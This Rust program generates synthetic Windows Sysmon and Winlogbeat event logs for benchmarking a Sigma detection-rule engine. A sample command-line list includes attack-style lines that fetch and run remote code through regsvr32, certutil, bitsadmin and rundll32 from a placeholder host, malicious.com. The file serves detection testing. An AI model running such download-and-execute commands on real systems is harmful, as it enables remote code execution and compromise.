//! Windows Event Log Data Generator
//! 
//! Generates realistic Windows event data in ECS format similar to Winlogbeat output
//! for benchmarking against the Sigma rule engine.

use serde_json::{json, Value};
use clap::{Arg, Command};
use rand::prelude::*;
use std::fs::File;
use std::io::{BufWriter, Write};

/// Windows Event ID mappings to realistic event types
const SYSMON_EVENTS: &[(u32, &str)] = &[
    (1, "Process creation"),
    (2, "A process changed a file creation time"),
    (3, "Network connection"),
    (4, "Sysmon service state changed"),
    (5, "Process terminated"),
    (6, "Driver loaded"),
    (7, "Image loaded"),
    (8, "CreateRemoteThread"),
    (9, "RawAccessRead"),
    (10, "ProcessAccess"),
    (11, "FileCreate"),
    (12, "RegistryEvent (Object create and delete)"),
    (13, "RegistryEvent (Value Set)"),
    (14, "RegistryEvent (Key and Value Rename)"),
    (15, "FileCreateStreamHash"),
    (17, "PipeEvent (Pipe Created)"),
    (18, "PipeEvent (Pipe Connected)"),
    (19, "WmiEvent (WmiEventFilter activity detected)"),
    (20, "WmiEvent (WmiEventConsumer activity detected)"),
    (21, "WmiEvent (WmiEventConsumerToFilter activity detected)"),
    (22, "DNSEvent (DNS query)"),
    (23, "FileDelete (A file delete was detected)"),
    (24, "ClipboardChange (New content in the clipboard)"),
    (25, "ProcessTampering (Process image change)"),
    (26, "FileDeleteDetected (File Delete logged)"),
];

const WINDOWS_SECURITY_EVENTS: &[(u32, &str)] = &[
    (4624, "An account was successfully logged on"),
    (4625, "An account failed to log on"),
    (4648, "A logon was attempted using explicit credentials"),
    (4672, "Special privileges assigned to new logon"),
    (4688, "A new process has been created"),
    (4689, "A process has exited"),
    (4720, "A user account was created"),
    (4724, "An attempt was made to reset an account's password"),
    (4728, "A member was added to a security-enabled global group"),
    (4732, "A member was added to a security-enabled local group"),
    (4756, "A member was added to a security-enabled universal group"),
];

/// Common Windows process names
const WINDOWS_PROCESSES: &[&str] = &[
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\System32\\powershell.exe",
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\explorer.exe",
    "C:\\Windows\\System32\\winlogon.exe",
    "C:\\Windows\\System32\\lsass.exe",
    "C:\\Windows\\System32\\spoolsv.exe",
    "C:\\Windows\\System32\\services.exe",
    "C:\\Windows\\System32\\wininit.exe",
    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
    "C:\\Windows\\System32\\notepad.exe",
    "C:\\Windows\\System32\\calc.exe",
    "C:\\Windows\\System32\\taskmgr.exe",
    "C:\\Windows\\System32\\regsvr32.exe",
    "C:\\Windows\\System32\\rundll32.exe",
    "C:\\Windows\\System32\\mshta.exe",
    "C:\\Windows\\System32\\cscript.exe",
    "C:\\Windows\\System32\\wscript.exe",
];

/// Suspicious processes that should trigger some rules
const SUSPICIOUS_PROCESSES: &[&str] = &[
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\System32\\powershell.exe", 
    "C:\\Windows\\System32\\regsvr32.exe",
    "C:\\Windows\\System32\\rundll32.exe",
    "C:\\Windows\\System32\\mshta.exe",
    "C:\\Windows\\System32\\certutil.exe",
    "C:\\Windows\\System32\\bitsadmin.exe",
];

/// Common command line patterns
const COMMAND_LINES: &[&str] = &[
    "cmd.exe /c dir",
    "cmd.exe /c whoami",
    "cmd.exe /c net user",
    "cmd.exe /c ipconfig",
    "powershell.exe -ExecutionPolicy Bypass",
    "powershell.exe -EncodedCommand",
    "powershell.exe -WindowStyle Hidden",
    "regsvr32.exe /s /u /i:http://malicious.com/script.sct scrobj.dll",
    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";",
    "certutil.exe -urlcache -split -f http://malicious.com/payload.exe",
    "bitsadmin.exe /transfer /download /priority high http://malicious.com/file.exe",
];

/// Windows user names
const USERS: &[&str] = &[
    "SYSTEM", "Administrator", "Guest", "DefaultAccount",
    "john.doe", "jane.smith", "admin", "user", "service_account",
    "NT AUTHORITY\\SYSTEM", "NT AUTHORITY\\LOCAL SERVICE", 
    "NT AUTHORITY\\NETWORK SERVICE",
];

/// Network destinations for connection events
const NETWORK_DESTINATIONS: &[&str] = &[
    "192.168.1.100", "10.0.0.50", "172.16.0.10",
    "8.8.8.8", "1.1.1.1", "208.67.222.222",
    "malicious-domain.com", "suspicious-site.net",
    "legitimate-service.com", "update-server.microsoft.com",
];

fn generate_base_event(event_id: u32, timestamp: &str) -> Value {
    json!({
        "@timestamp": timestamp,
        "agent": {
            "type": "winlogbeat",
            "version": "8.5.0",
            "hostname": format!("WIN-{}", random_string(8))
        },
        "ecs": {
            "version": "8.5.0"
        },
        "host": {
            "name": format!("WIN-{}", random_string(8)),
            "os": {
                "family": "windows",
                "name": "Windows Server 2019",
                "version": "10.0.17763"
            }
        },
        "event": {
            "action": "Process creation",
            "category": ["process"],
            "code": event_id,
            "kind": "event",
            "provider": "Microsoft-Windows-Sysmon",
            "type": ["start"]
        },
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "computer_name": format!("WIN-{}.domain.local", random_string(8)),
            "event_id": event_id,
            "provider_name": "Microsoft-Windows-Sysmon",
            "record_id": thread_rng().gen_range(1000000..9999999),
            "task": "Process creation (rule: ProcessCreate)"
        }
    })
}

fn generate_process_creation_event(suspicious: bool) -> Value {
    let mut rng = thread_rng();
    let timestamp = format!("2023-{:02}-{:02}T{:02}:{:02}:{:02}.{}Z", 
        rng.gen_range(1..=12), 
        rng.gen_range(1..=28),
        rng.gen_range(0..24),
        rng.gen_range(0..60),
        rng.gen_range(0..60),
        rng.gen_range(100..999)
    );
    
    let mut event = generate_base_event(1, &timestamp);
    
    let (image, command_line) = if suspicious && rng.gen_bool(0.3) {
        // Generate suspicious activity
        let proc = SUSPICIOUS_PROCESSES.choose(&mut rng).unwrap();
        let cmd = if proc.contains("powershell") {
            format!("{} -EncodedCommand {}", proc, base64_encode(&random_string(50)))
        } else if proc.contains("cmd") {
            format!("{} /c {}", proc, ["whoami", "net user", "ipconfig /all"].choose(&mut rng).unwrap())
        } else {
            format!("{} {}", proc, random_string(20))
        };
        (proc.to_string(), cmd)
    } else {
        // Generate normal activity
        let proc = WINDOWS_PROCESSES.choose(&mut rng).unwrap();
        let cmd = match proc {
            p if p.contains("chrome") => format!("{} --new-tab https://example.com", p),
            p if p.contains("notepad") => format!("{} document.txt", p),
            p if p.contains("explorer") => p.to_string(),
            _ => format!("{} {}", proc, random_string(10))
        };
        (proc.to_string(), cmd)
    };
    
    let user = USERS.choose(&mut rng).unwrap();
    let parent_image = WINDOWS_PROCESSES.choose(&mut rng).unwrap();
    
    // Add process-specific fields
    event.as_object_mut().unwrap().extend([
        ("process".to_string(), json!({
            "args": command_line.split_whitespace().collect::<Vec<_>>(),
            "command_line": command_line,
            "executable": image,
            "name": image.split('\\').last().unwrap_or(&image),
            "pid": rng.gen_range(1000..65535),
            "parent": {
                "executable": parent_image,
                "name": parent_image.split('\\').last().unwrap_or(parent_image),
                "pid": rng.gen_range(100..1000)
            }
        })),
        ("user".to_string(), json!({
            "name": user,
            "domain": if user.starts_with("NT AUTHORITY") { "NT AUTHORITY" } else { "DOMAIN" }
        })),
        // Add raw Sysmon fields for compatibility
        ("EventID".to_string(), json!(1)),
        ("Image".to_string(), json!(image)),
        ("CommandLine".to_string(), json!(command_line)),
        ("User".to_string(), json!(user)),
        ("ParentImage".to_string(), json!(parent_image)),
        ("ProcessId".to_string(), json!(rng.gen_range(1000..65535))),
        ("ParentProcessId".to_string(), json!(rng.gen_range(100..1000))),
    ].into_iter());
    
    event
}

fn generate_network_connection_event() -> Value {
    let mut rng = thread_rng();
    let timestamp = format!("2023-{:02}-{:02}T{:02}:{:02}:{:02}.{}Z", 
        rng.gen_range(1..=12), 
        rng.gen_range(1..=28),
        rng.gen_range(0..24),
        rng.gen_range(0..60),
        rng.gen_range(0..60),
        rng.gen_range(100..999)
    );
    
    let mut event = generate_base_event(3, &timestamp);
    
    let image = WINDOWS_PROCESSES.choose(&mut rng).unwrap();
    let dest_ip = NETWORK_DESTINATIONS.choose(&mut rng).unwrap();
    let dest_port = [80, 443, 53, 8080, 8443, 3389, 445, 139].choose(&mut rng).unwrap();
    let src_port = rng.gen_range(49152..65535);
    
    event.as_object_mut().unwrap().extend([
        ("source".to_string(), json!({
            "ip": "192.168.1.100",
            "port": src_port
        })),
        ("destination".to_string(), json!({
            "ip": dest_ip,
            "port": dest_port
        })),
        ("network".to_string(), json!({
            "protocol": "tcp",
            "direction": "outbound"
        })),
        // Raw Sysmon fields
        ("EventID".to_string(), json!(3)),
        ("Image".to_string(), json!(image)),
        ("SourceIp".to_string(), json!("192.168.1.100")),
        ("SourcePort".to_string(), json!(src_port)),
        ("DestinationIp".to_string(), json!(dest_ip)),
        ("DestinationPort".to_string(), json!(dest_port)),
        ("Protocol".to_string(), json!("tcp")),
    ].into_iter());
    
    event
}

fn generate_registry_event() -> Value {
    let mut rng = thread_rng();
    let timestamp = format!("2023-{:02}-{:02}T{:02}:{:02}:{:02}.{}Z", 
        rng.gen_range(1..=12), 
        rng.gen_range(1..=28),
        rng.gen_range(0..24),
        rng.gen_range(0..60),
        rng.gen_range(0..60),
        rng.gen_range(100..999)
    );
    
    let mut event = generate_base_event(13, &timestamp);
    
    let registry_keys = [
        "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services",
        "HKLM\\SOFTWARE\\Classes\\exefile\\shell\\open\\command",
    ];
    
    let key = registry_keys.choose(&mut rng).unwrap();
    let image = WINDOWS_PROCESSES.choose(&mut rng).unwrap();
    
    event.as_object_mut().unwrap().extend([
        ("registry".to_string(), json!({
            "key": key,
            "value": random_string(10),
            "data": {
                "strings": [format!("C:\\temp\\{}.exe", random_string(8))]
            }
        })),
        // Raw Sysmon fields
        ("EventID".to_string(), json!(13)),
        ("Image".to_string(), json!(image)),
        ("TargetObject".to_string(), json!(format!("{}\\{}", key, random_string(10)))),
        ("Details".to_string(), json!(format!("C:\\temp\\{}.exe", random_string(8)))),
    ].into_iter());
    
    event
}

fn generate_pipe_event() -> Value {
    let mut rng = thread_rng();
    let timestamp = format!("2023-{:02}-{:02}T{:02}:{:02}:{:02}.{}Z", 
        rng.gen_range(1..=12), 
        rng.gen_range(1..=28),
        rng.gen_range(0..24),
        rng.gen_range(0..60),
        rng.gen_range(0..60),
        rng.gen_range(100..999)
    );
    
    let mut event = generate_base_event(17, &timestamp);
    
    let pipe_names = [
        "\\pipe\\lsarpc",
        "\\pipe\\samr", 
        "\\pipe\\netlogon",
        "\\pipe\\srvsvc",
        "\\pipe\\wkssvc",
        "\\pipe\\spoolss",
        "\\pipe\\MSCTF.Server.{guid}",
        "\\pipe\\mojo.{pid}.{rand}",
    ];
    
    let pipe_name = pipe_names.choose(&mut rng).unwrap();
    let image = WINDOWS_PROCESSES.choose(&mut rng).unwrap();
    
    event.as_object_mut().unwrap().extend([
        // Raw Sysmon fields  
        ("EventID".to_string(), json!(17)),
        ("Image".to_string(), json!(image)),
        ("PipeName".to_string(), json!(pipe_name.replace("{guid}", &random_string(36)).replace("{pid}", &rng.gen_range(1000..9999).to_string()).replace("{rand}", &random_string(8)))),
    ].into_iter());
    
    event
}

fn random_string(length: usize) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let mut rng = thread_rng();
    (0..length)
        .map(|_| CHARS[rng.gen_range(0..CHARS.len())] as char)
        .collect()
}

fn base64_encode(input: &str) -> String {
    use base64::{Engine as _, engine::general_purpose};
    general_purpose::STANDARD.encode(input.as_bytes())
}

fn generate_event_mix(suspicious_ratio: f64) -> Value {
    let mut rng = thread_rng();
    
    let event_type = rng.gen_range(0..100);
    match event_type {
        0..=60 => generate_process_creation_event(rng.gen_bool(suspicious_ratio)), // 60% process creation
        61..=75 => generate_network_connection_event(), // 15% network
        76..=90 => generate_registry_event(), // 15% registry  
        91..=99 => generate_pipe_event(), // 10% pipes
        _ => generate_process_creation_event(false)
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let matches = Command::new("Windows Event Data Generator")
        .version("1.0")
        .about("Generates realistic Windows event data in ECS format for Sigma benchmarking")
        .arg(Arg::new("count")
            .short('c')
            .long("count")
            .value_name("NUMBER")
            .help("Number of events to generate")
            .default_value("10000"))
        .arg(Arg::new("output")
            .short('o')
            .long("output")
            .value_name("FILE")
            .help("Output file (JSONL format)")
            .default_value("windows_events.jsonl"))
        .arg(Arg::new("suspicious-ratio")
            .short('s')
            .long("suspicious")
            .value_name("RATIO")
            .help("Ratio of suspicious events (0.0-1.0)")
            .default_value("0.05"))
        .get_matches();

    let count: usize = matches.get_one::<String>("count").unwrap().parse()?;
    let output_file = matches.get_one::<String>("output").unwrap();
    let suspicious_ratio: f64 = matches.get_one::<String>("suspicious-ratio").unwrap().parse()?;

    println!("Generating {} Windows events with {:.1}% suspicious ratio...", count, suspicious_ratio * 100.0);
    
    let file = File::create(output_file)?;
    let mut writer = BufWriter::new(file);
    
    for i in 0..count {
        if i % 1000 == 0 {
            println!("Generated {} events...", i);
        }
        
        let event = generate_event_mix(suspicious_ratio);
        writeln!(writer, "{}", serde_json::to_string(&event)?)?;
    }
    
    writer.flush()?;
    println!("Generated {} events in {}", count, output_file);
    
    Ok(())
}

// Add base64 dependency to Cargo.toml
use base64;